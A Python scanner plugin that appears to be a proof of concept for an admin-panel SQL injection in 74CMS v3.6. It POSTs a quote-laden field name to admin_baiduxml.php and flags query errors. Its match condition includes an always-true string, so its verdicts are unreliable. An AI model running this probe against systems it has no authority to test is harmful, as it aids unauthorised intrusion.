# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = '74CMS_0023'  # 平台漏洞编号，留空
    name = '骑士CMS 后台SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-08-02'  # 漏洞公布时间
    desc = '''
        在admin_baiduxml.php文件中，当act是setsave时，执行了如下语句：

        foreach($_POST as $k => $v) { 
            !$db->query("UPDATE ".table('baiduxml')." SET value='{$v}' WHERE name='{$k}'")?adminmsg('保存失败', 1):""; 
        } 
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3981/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = 'v3.6_20150902'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2cd6270d-c163-4915-9e5c-7991082a01e0'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/upload/admin/admin_baiduxml.php?ac=setsave'
            data = "xmlmax=1111&xmlpagesize=112&sunrain'=aaa"
            url = self.target + payload
            r = requests.post(url, data=data)

            if 'Error:Query error' in r.text and "value='aaa'":
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
